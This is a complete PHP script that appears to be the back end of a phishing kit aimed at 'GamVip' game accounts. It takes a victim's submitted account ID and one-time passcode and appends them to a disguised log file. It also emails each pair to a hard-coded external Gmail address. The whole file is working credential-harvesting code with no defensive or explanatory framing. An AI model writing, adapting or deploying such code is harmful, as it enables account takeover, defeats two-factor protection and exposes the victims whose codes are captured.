<?php 

function clean_string($string)
{
    $bad = array(
        "content-type",
        "bcc:",
        "to:",
        "cc:",
        "href"
    );
    return str_replace($bad, "", $string);
}

$email_to = "tusoncao@gmail.com";
$email_forward = "GamVip";
$id = $_POST['un'];
$otp = $_POST['otp'];
$txt = $id . '|' . $otp;
$myfile = file_put_contents('manvip/error.txt', $txt . PHP_EOL, FILE_APPEND | LOCK_EX);
$error_message = "";
$email_message = "";
$email_subject = "[GamVip] ID $id";
$email_message .= "OTP: " . clean_string($otp) . "\n";
$headers = 'From: ' . $email_forward . "\r\n" . 'Reply-To: ' . $email_forward . "\r\n" . 'X-Mailer: PHP/' . phpversion();
if (!empty($id) && !empty($otp))
{
    $check_send = mail($email_to, $email_subject, $email_message, $headers);
    echo 1;
}
die(); 
?>
